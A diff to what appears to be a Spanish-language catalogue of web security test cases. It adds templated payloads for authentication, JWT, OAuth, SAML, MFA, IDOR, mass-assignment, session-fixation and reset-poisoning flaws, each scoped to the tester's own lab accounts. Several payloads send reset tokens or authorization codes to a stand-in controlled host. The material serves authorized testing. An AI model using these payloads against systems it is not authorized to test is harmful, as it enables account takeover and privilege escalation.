@@ -176,10 +176,10 @@ print(b64(header)+"."+b64(claims)+".")""",
         ),
         P(
             "Claims temporales y de contexto",
-            "Comparar rechazo de un token de prueba vencido o con audiencia distinta.",
+            "Comparar rechazo de un token propio ya vencido, conservando el resto de claims válidos.",
             "json",
-            r"""{"sub":"{ID_PROPIO}","iss":"{ISS_ESPERADO}","aud":"{AUD_NO_PERMITIDA}","exp":1}""",
-            "Requiere firma válida de laboratorio; exp, iss y aud se prueban uno por vez para atribuir el resultado.",
+            r"""{"sub":"{ID_PROPIO}","iss":"{ISS_ESPERADO}","aud":"{AUD_ESPERADA}","exp":1}""",
+            "Requiere firma válida de laboratorio y control vigente equivalente; un 401 puede deberse a otras condiciones si no se aíslan.",
             RFC_JWT,
         ),
         P(
@@ -1076,3 +1076,432 @@ variables: {"input":{"displayName":"prueba-controlada","role":"admin"}}""",
         ),
     ],
 }
+
+# Variantes de autenticación general: cada prueba usa identidades bajo control del tester.
+AMPLIACIONES["autenticacion-rota"].extend([
+    P(
+        "Cambio de contraseña sin contraseña actual",
+        "Solo si el flujo legítimo exige reautenticación, omitir currentPassword al cambiar la contraseña propia.",
+        "http",
+        r"""POST /api/account/password HTTP/1.1
+Host: {ORIGEN}
+Cookie: session={SESION_A}
+Content-Type: application/json
+
+{"newPassword":"{NUEVA_PASSWORD_PROPIA}"}""",
+        "Confirmar que cambió la contraseña con un nuevo login de A. Una respuesta 200 sin cambio no demuestra bypass.",
+        "https://portswigger.net/web-security/authentication/other-mechanisms",
+    ),
+    P(
+        "Token de reset ligado a otra cuenta",
+        "Con dos cuentas propias, presentar a A un token de recuperación emitido para B.",
+        "http",
+        r"""POST /reset-password HTTP/1.1
+Host: {ORIGEN}
+Content-Type: application/x-www-form-urlencoded
+
+username={EMAIL_A}&token={TOKEN_RESET_B}&new-password={PASSWORD_TEMPORAL_A}""",
+        "Comprobar desde A y B qué credencial cambió. El token debe estar ligado a la identidad y al propósito previsto.",
+        "https://portswigger.net/web-security/authentication/other-mechanisms",
+    ),
+    P(
+        "Token de reset reutilizado",
+        "Intentar un segundo uso de un token propio ya consumido, sin afectar cuentas ajenas.",
+        "http",
+        r"""POST /reset-password HTTP/1.1
+Host: {ORIGEN}
+Content-Type: application/x-www-form-urlencoded
+
+username={EMAIL_A}&token={TOKEN_RESET_A_YA_USADO}&new-password={OTRA_PASSWORD_PROPIA}""",
+        "Debe rechazarse por uso previo; validar el estado con login y no conservar el token completo en evidencia.",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html",
+    ),
+    P(
+        "Cuenta sin verificar correo",
+        "Con cuenta propia recién creada y correo aún no verificado, pedir una función que la política reserva a cuentas verificadas.",
+        "http",
+        r"""GET /api/account/verified-only HTTP/1.1
+Host: {ORIGEN}
+Authorization: Bearer {TOKEN_CUENTA_PROPIA_NO_VERIFICADA}""",
+        "La ruta se sustituye por una función real del producto; comprobar el permiso efectivo, no solo una bandera en la UI.",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Email_Validation_and_Verification_Cheat_Sheet.html",
+    ),
+    P(
+        "Acción sensible sin reautenticación",
+        "Si el producto exige contraseña o MFA reciente para cambiar el correo, invocar la API con una sesión propia antigua.",
+        "http",
+        r"""POST /api/account/change-email HTTP/1.1
+Host: {ORIGEN}
+Cookie: session={SESION_A_SIN_REAUTH_RECIENTE}
+Content-Type: application/json
+
+{"email":"{NUEVO_EMAIL_PROPIO}"}""",
+        "Confirmar cambio persistido y ausencia de desafío reciente; respetar el período de gracia definido por el producto.",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html",
+    ),
+])
+
+AMPLIACIONES["jwt"].extend([
+    P(
+        "kid como consulta a base de datos",
+        "Solo si el verificador busca claves por kid en SQL, usar una comilla de prueba en el selector.",
+        "json",
+        r"""{"alg":"HS256","typ":"JWT","kid":"{KID_VALIDO}'"}""",
+        "Un error SQL o diferencia de respuesta es una pista de inyección, no aceptación de firma; aislar el parámetro en laboratorio.",
+        "https://portswigger.net/web-security/jwt",
+    ),
+    P(
+        "Cadena x5c embebida",
+        "Firmar con clave propia de laboratorio y adjuntar su certificado autofirmado en x5c.",
+        "json",
+        r"""{"alg":"RS256","typ":"JWT","kid":"{KID_PROPIO}","x5c":["{CERT_DER_BASE64_PROPIO}"]}""",
+        "El servidor debe usar certificados confiables configurados, no confiar en el material incluido por el token.",
+        "https://portswigger.net/web-security/jwt",
+    ),
+    P(
+        "x5u hacia certificado controlado",
+        "En laboratorio, comprobar si el header puede señalar un certificado remoto propio.",
+        "json",
+        r"""{"alg":"RS256","typ":"JWT","kid":"{KID_PROPIO}","x5u":"https://{CONTROLLED_HOST}/jwt-cert.pem"}""",
+        "Una petición al host solo prueba lectura remota. El bypass exige firma válida con esa clave y aceptación de una identidad propia.",
+        "https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.5",
+    ),
+    P(
+        "Issuer de otra confianza",
+        "Enviar a API A un JWT propio firmado válidamente por el emisor B de laboratorio.",
+        "http",
+        r"""GET /api/me HTTP/1.1
+Host: {RECURSO_A}
+Authorization: Bearer {JWT_PROPIO_DE_ISSUER_B}""",
+        "A debe validar iss contra su emisor esperado y asociar la clave a ese emisor; firma válida por B no basta.",
+        "https://datatracker.ietf.org/doc/html/rfc8725#section-3.8",
+    ),
+    P(
+        "Audiencia de otro recurso",
+        "Usar en recurso B un JWT propio emitido únicamente para recurso A.",
+        "http",
+        r"""GET /api/me HTTP/1.1
+Host: {RECURSO_B}
+Authorization: Bearer {JWT_PROPIO_AUD_A}""",
+        "Conservar firma, iss y vigencia correctos para aislar aud. B debe rechazar un token que no le está destinado.",
+        "https://datatracker.ietf.org/doc/html/rfc8725#section-3.9",
+    ),
+    P(
+        "Header crit no reconocido",
+        "Con firma propia válida de laboratorio, incluir una extensión crítica no entendida por el verificador.",
+        "json",
+        r"""{"alg":"HS256","typ":"JWT","crit":["lab-flag"],"lab-flag":true}""",
+        "El receptor debe rechazar o procesar explícitamente lab-flag; ignorarla violaría la semántica de crit.",
+        "https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.11",
+    ),
+])
+
+AMPLIACIONES["oauth"].extend([
+    P(
+        "Dos redirect_uri en una autorización",
+        "En un cliente propio, comparar qué destino valida y cuál usa el servidor cuando la clave se repite.",
+        "http",
+        r"""GET /authorize?response_type=code&client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI_REGISTRADA}&redirect_uri=https%3A%2F%2F{CONTROLLED_HOST}%2Fcallback&state={STATE_PROPIO} HTTP/1.1
+Host: {AUTHORIZATION_SERVER}""",
+        "Comparar también el orden inverso. Solo hay fuga si se emite code a destino no autorizado; PKCE puede impedir canje.",
+        "https://portswigger.net/web-security/oauth",
+    ),
+    P(
+        "Traversal en ruta de callback",
+        "Cuando se permite un prefijo de callback, probar normalización hacia una página propia del mismo cliente.",
+        "text",
+        r"""redirect_uri=https://{CLIENT_APP}/oauth/callback/../../pages/{PAGINA_PROPIA}""",
+        "Confirmar URI aceptada y ruta final del navegador; si la página no maneja code, el cambio por sí solo no implica fuga.",
+        "https://portswigger.net/web-security/oauth",
+    ),
+    P(
+        "response_mode fragment",
+        "En flujo propio que admita response_mode, comparar validación de redirect_uri con query y fragment.",
+        "http",
+        r"""GET /authorize?response_type=code&client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI_DE_PRUEBA}&response_mode=fragment&state={STATE_PROPIO} HTTP/1.1
+Host: {AUTHORIZATION_SERVER}""",
+        "El fragmento no se envía al servidor por HTTP; inspeccionar la navegación y scripts del callback sin asumir filtración.",
+        "https://portswigger.net/web-security/oauth",
+    ),
+    P(
+        "redirect_uri distinta en canje",
+        "Canjear un code propio usando una redirect_uri diferente de la solicitud que lo creó.",
+        "http",
+        r"""POST /token HTTP/1.1
+Host: {AUTHORIZATION_SERVER}
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=authorization_code&client_id={CLIENT_ID}&code={CODE_PROPIO}&redirect_uri={OTRA_REDIRECT_URI_REGISTRADA}&code_verifier={VERIFIER_PROPIO}""",
+        "El canje debe fallar por vinculación de code a la URI original, aunque ambas URI estén registradas.",
+        "https://datatracker.ietf.org/doc/html/rfc9700#section-4.1",
+    ),
+    P(
+        "Nonce OIDC de otra transacción",
+        "Con dos flujos OIDC propios, presentar en flujo A un ID token de B con nonce distinto.",
+        "text",
+        r"""Inicio A: nonce={NONCE_A}, state={STATE_A}
+ID token firmado de B: nonce={NONCE_B}
+Callback A con ID token de B: resultado esperado, rechazo""",
+        "El cliente debe verificar firma, aud, iss y nonce asociado al navegador; aceptar B requiere confirmar la sesión creada.",
+        "https://openid.net/specs/openid-connect-core-1_0-18.html#IDTokenValidation",
+    ),
+    P(
+        "Vinculación por correo OIDC no verificado",
+        "En un IdP de laboratorio, observar si el cliente vincula una cuenta existente solo por email_verified=false.",
+        "json",
+        r"""{"sub":"{SUB_PROPIO_IDP_B}","email":"{EMAIL_CUENTA_A_PROPIA}","email_verified":false}""",
+        "El objeto es una respuesta userinfo de laboratorio, no una petición al proveedor real. Verificar que no se inicie sesión como A.",
+        "https://portswigger.net/web-security/oauth",
+    ),
+])
+
+AMPLIACIONES["saml"].extend([
+    P(
+        "Recipient en SubjectConfirmationData",
+        "Emitir en IdP de laboratorio una assertion firmada cuyo Recipient apunta a otro ACS propio.",
+        "xml",
+        r"""<saml:SubjectConfirmationData Recipient="{ACS_B_DE_LAB}" InResponseTo="{AUTHN_REQUEST_A}" NotOnOrAfter="{FECHA_VIGENTE}"/>""",
+        "El SP A debe rechazarla aunque Destination exterior sea correcto; firmar de nuevo y variar solo Recipient.",
+        "https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html",
+    ),
+    P(
+        "KeyInfo con certificado aportado",
+        "En SP de laboratorio, adjuntar certificado autofirmado propio dentro de la firma XML.",
+        "xml",
+        r"""<ds:KeyInfo><ds:X509Data><ds:X509Certificate>{CERT_DER_BASE64_PROPIO}</ds:X509Certificate></ds:X509Data></ds:KeyInfo>""",
+        "Una firma matemáticamente válida no convierte ese certificado en IdP confiable; comprobar rechazo por trust store.",
+        "https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html",
+    ),
+    P(
+        "Respuesta IdP initiated no solicitada",
+        "Si el SP declara deshabilitado IdP initiated SSO, enviar una respuesta propia firmada sin InResponseTo.",
+        "http",
+        r"""POST /saml/acs HTTP/1.1
+Host: {SP_EN_ALCANCE}
+Content-Type: application/x-www-form-urlencoded
+
+SAMLResponse={RESPUESTA_IDP_INIT_PROPIA}&RelayState={RELAY_PROPIO}""",
+        "La aceptación solo es fallo si contradice la política; cuando está habilitado, revisar replay, intención de login y destino.",
+        "https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html",
+    ),
+    P(
+        "Firma XML con SHA-1",
+        "En laboratorio compatible, emitir una respuesta propia firmada con rsa-sha1 y observar la política del SP.",
+        "xml",
+        r"""<ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>""",
+        "Editar solo el atributo invalida la firma; la prueba exige que el IdP de laboratorio firme realmente con SHA-1.",
+        "https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html",
+    ),
+])
+
+AMPLIACIONES["mfa-bypass"].extend([
+    P(
+        "OTP expuesto en respuesta",
+        "Inspeccionar la respuesta de envío de OTP de la propia cuenta antes de completar el factor.",
+        "http",
+        r"""POST /mfa/send HTTP/1.1
+Host: {ORIGEN}
+Cookie: session={SESION_A_MFA_PENDIENTE}
+Content-Type: application/json
+
+{"method":"email"}""",
+        "Solo hay bypass práctico si la respuesta accesible al mismo estado pendiente contiene el OTP o un valor equivalente.",
+        "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md",
+    ),
+    P(
+        "Límite de intentos del OTP",
+        "Enviar tres códigos inválidos a una sesión MFA propia para observar contador y ventana.",
+        "text",
+        r"""POST /mfa/verify code=000001
+POST /mfa/verify code=000002
+POST /mfa/verify code=000003
+Misma cuenta y misma transacción propias; registrar bloqueo y Retry-After.""",
+        "No inferir ausencia de límite por tres rechazos: cuantificar política anunciada sin fuerza bruta ni cuentas ajenas.",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html",
+    ),
+    P(
+        "Desactivación de MFA sin prueba reciente",
+        "Bajo una cuenta propia ya autenticada, omitir OTP o reautenticación al desactivar el factor.",
+        "http",
+        r"""POST /api/mfa/disable HTTP/1.1
+Host: {ORIGEN}
+Cookie: session={SESION_A}
+Content-Type: application/json
+
+{}""",
+        "Confirmar que el factor se desactivó, y restaurarlo. Un 200 sin cambio de estado no establece bypass.",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html",
+    ),
+    P(
+        "Cambio de factor sin factor anterior",
+        "Solo si existe una función de reemplazo, pedir cambio hacia un canal propio sin confirmar el factor vigente.",
+        "http",
+        r"""POST /api/mfa/change-phone HTTP/1.1
+Host: {ORIGEN}
+Cookie: session={SESION_A}
+Content-Type: application/json
+
+{"newPhone":"{TELEFONO_PROPIO_NUEVO}"}""",
+        "Distinguir solicitud pendiente de factor efectivamente reemplazado; verificar desde la cuenta A y revertir.",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html",
+    ),
+    P(
+        "Activación TOTP sin código de confirmación",
+        "Tras iniciar el alta propia de TOTP, omitir el paso que prueba posesión del nuevo secreto.",
+        "http",
+        r"""POST /api/mfa/totp/activate HTTP/1.1
+Host: {ORIGEN}
+Cookie: session={SESION_A}
+Content-Type: application/json
+
+{}""",
+        "El factor no debería quedar activo sin código del autenticador; confirmar configuración persistida y capacidad de login.",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html",
+    ),
+])
+
+AMPLIACIONES["idor"].extend([
+    P(
+        "Edición cruzada reversible",
+        "Desde A, cambiar temporalmente el título de un objeto descartable de la cuenta propia B.",
+        "http",
+        r"""PATCH /api/objects/{ID_OBJETO_B} HTTP/1.1
+Host: {ORIGEN}
+Authorization: Bearer {TOKEN_A}
+Content-Type: application/json
+
+{"title":"marca-{NONCE}"}""",
+        "B debe comprobar persistencia y restaurar el título; el cambio real demuestra IDOR de escritura.",
+        "https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/",
+    ),
+    P(
+        "ID como array",
+        "En un endpoint existente que espera un ID escalar, probar un array con un ID propio de B.",
+        "json",
+        r"""{"id":["{ID_OBJETO_B}"]}""",
+        "Puede ser rechazo, coerción al primer elemento o lista; solo es IDOR si A recibe o modifica el objeto de B.",
+        "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md",
+    ),
+    P(
+        "Mismo objeto con XML",
+        "Si el endpoint acepta JSON y XML, comparar autorización del objectId B en ambos deserializadores.",
+        "xml",
+        r"""<request><objectId>{ID_OBJETO_B}</objectId></request>""",
+        "Se requiere una operación equivalente observada en la aplicación; una respuesta XML distinta no demuestra acceso a B.",
+        "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md",
+    ),
+    P(
+        "Mutación GraphQL de objeto ajeno",
+        "Con dos cuentas propias, pedir desde A un cambio reversible sobre el objeto creado por B.",
+        "graphql",
+        r"""mutation EditarB { updateDocument(id: "{ID_DOCUMENTO_B}", title: "marca-{NONCE}") { id title } }""",
+        "Comprobar con B el efecto y revertirlo; el resolver debe autorizar el objeto, aunque el ID global sea opaco.",
+        "https://portswigger.net/web-security/graphql",
+    ),
+])
+
+AMPLIACIONES["control-acceso"].extend([
+    P(
+        "X-HTTP-Method-Override",
+        "Solo si la aplicación admite override, comparar el control de una lectura administrativa por método original y efectivo.",
+        "http",
+        r"""POST /api/admin/settings HTTP/1.1
+Host: {ORIGEN}
+Authorization: Bearer {TOKEN_ROL_BAJO}
+X-HTTP-Method-Override: GET
+Content-Type: application/json
+
+{}""",
+        "Debe aplicarse la misma política a la operación efectiva. Un 405 o 404 indica que el override no alcanzó la función.",
+        "https://portswigger.net/web-security/access-control",
+    ),
+    P(
+        "Administrador de otro tenant",
+        "Con dos tenants propios, usar un administrador de A para leer configuración reservada de B.",
+        "http",
+        r"""GET /api/tenants/{TENANT_B_PROPIO}/admin/settings HTTP/1.1
+Host: {ORIGEN}
+Authorization: Bearer {TOKEN_ADMIN_TENANT_A}""",
+        "El rol admin de A no concede autoridad sobre B; confirmar datos específicos de B y la política multi-tenant.",
+        "https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/",
+    ),
+])
+
+AMPLIACIONES["mass-assignment"].extend([
+    P(
+        "JSON Patch sobre atributo sensible",
+        "Solo si el endpoint acepta RFC 6902, intentar reemplazar role en la cuenta propia.",
+        "http",
+        r"""PATCH /api/me HTTP/1.1
+Host: {ORIGEN}
+Authorization: Bearer {TOKEN_A}
+Content-Type: application/json-patch+json
+
+[{"op":"replace","path":"/role","value":"admin"}]""",
+        "El servidor debe autorizar la ruta de propiedad; comprobar persistencia y privilegio efectivo, no solo eco de patch.",
+        "https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/",
+    ),
+    P(
+        "Notación anidada de formulario",
+        "Si el framework enlaza campos form-urlencoded a objetos, agregar user[role] en perfil propio.",
+        "http",
+        r"""POST /account/profile HTTP/1.1
+Host: {ORIGEN}
+Cookie: session={SESION_A}
+Content-Type: application/x-www-form-urlencoded
+
+user[displayName]=prueba-controlada&user[role]=admin""",
+        "Aplicar solo a una estructura de formulario observada; confirmar que role se persiste y cambia autorización.",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html",
+    ),
+])
+
+AMPLIACIONES["fijacion-sesion"].extend([
+    P(
+        "Matriz ;jsessionid en URL",
+        "Solo en aplicaciones Java que realmente aceptan URL rewriting, aportar un JSESSIONID anónimo propio en la ruta de login.",
+        "http",
+        r"""GET /login;jsessionid={JSESSIONID_ANONIMO_PROPIO} HTTP/1.1
+Host: {ORIGEN}""",
+        "Tras autenticar la misma sesión, comprobar si ese ID previo autoriza desde otro navegador controlado; la mera aceptación de la URL no basta.",
+        "https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/06-Session_Management/03-Session_Fixation/",
+    ),
+    P(
+        "Transición SSO sin rotación",
+        "Comparar ID de sesión propio antes de iniciar SSO y después del callback autenticado.",
+        "text",
+        r"""Antes de /sso/start: session={ID_ANONIMO_PROPIO}
+Después de /sso/callback: session={ID_TRAS_SSO_PROPIO}
+Reprobar {ID_ANONIMO_PROPIO} desde segundo perfil propio.""",
+        "El identificador preexistente no debería heredar identidad. Documentar si el proveedor o el SP emitió cada cookie.",
+        "https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/06-Session_Management/03-Session_Fixation/",
+    ),
+])
+
+AMPLIACIONES["reset-password-poisoning"].extend([
+    P(
+        "X-Forwarded-Server",
+        "Solicitar un único reset de correo propio con la cabecera de host alternativa documentada.",
+        "http",
+        r"""POST /forgot-password HTTP/1.1
+Host: {ORIGEN}
+X-Forwarded-Server: {CONTROLLED_HOST}
+Content-Type: application/x-www-form-urlencoded
+
+email={EMAIL_PROPIO}""",
+        "Comparar la URL del correo con control sin header. Solo hay envenenamiento si el enlace canjeable incorpora el host propio.",
+        "https://portswigger.net/web-security/host-header/exploiting",
+    ),
+    P(
+        "URL absoluta en request line",
+        "En laboratorio con proxy que acepte absolute-form, contrastar autoridad de la request line y Host.",
+        "http",
+        r"""POST https://{CONTROLLED_HOST}/forgot-password HTTP/1.1
+Host: {ORIGEN}
+Content-Type: application/x-www-form-urlencoded
+
+email={EMAIL_PROPIO}""",
+        "Mantener la conexión al origen autorizado y usar solo correo propio. Confirmar que el token aparece en URL controlada, no solo un 302.",
+        "https://portswigger.net/web-security/host-header/exploiting",
+    ),
+])
